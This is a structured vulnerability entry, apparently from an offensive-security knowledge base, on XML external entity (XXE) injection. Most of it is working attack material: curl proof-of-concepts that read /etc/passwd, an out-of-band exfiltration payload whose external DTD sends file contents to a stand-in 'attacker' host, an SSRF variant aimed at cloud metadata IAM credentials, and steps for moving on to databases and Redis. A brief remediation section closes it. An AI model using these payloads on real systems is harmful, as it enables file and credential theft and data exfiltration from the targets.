---
title: XXE external entity injection (file read / SSRF / OOB exfiltration)
cve: None (implementation flaw)
severity: high
cvss: 8.2
product: Any endpoint that parses XML (SOAP, DOCX/SVG uploads, SAML)
versions: Any
ports: 80, 443
keywords: xxe, xml, external entities, file read, oob, saml
entry: Endpoints using Content-Type: application/xml
verified: false
sources: Compiled from public sources (implementation flaws)
---

## Fingerprinting

- The endpoint accepts XML (`Content-Type: application/xml` or `text/xml`);
- The server parses uploaded DOCX/XLSX/SVG files (conversion, previews).

## Prerequisites

- The target uses an XML parser with its default configuration (DTD/external entities not disabled).

## PoC

```bash
# 1) Basic check: read /etc/passwd
curl -s -X POST 'https://target/api/import' -H 'Content-Type: application/xml' --data-binary @- <<'XML'
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r><name>&x;</name></r>
XML
# Result: root:x:0:0 in the output = positive result
```

```bash
# 2) OOB exfiltration when no output is returned (parameter entities + external DTD)
# Host evil.dtd on attacker:
#   <!ENTITY % f SYSTEM "file:///etc/passwd">
#   <!ENTITY % p "<!ENTITY send SYSTEM 'http://attacker/?d=%f;'>">
cat > /tmp/xxe.xml <<'XML'
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % d SYSTEM "http://attacker/evil.dtd"> %d;]>
<r>&send;</r>
XML
curl -s -X POST 'https://target/api/import' -H 'Content-Type: application/xml' --data-binary @/tmp/xxe.xml
# Result: attacker receives a request containing the data = positive result
```

```bash
# 3) SSRF variant: read cloud metadata
# <!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

## Exploitation Steps

1. Find an XML entry point first (API/uploads/SAML);
2. Prefer reflected output; if none is returned, use OOB (external DTD);
3. After reading configuration, move to the database/Redis entries;
4. Evidence: response snippets or attacker logs.

## Remediation and Mitigation

- Disable DTDs and external entities in the parser (`disallow-doctype-decl=true`);
- Use secure parsing libraries for uploaded DOCX/SVG files and enforce size limits.

## References

- OWASP XXE Prevention Cheat Sheet; CWE-611.
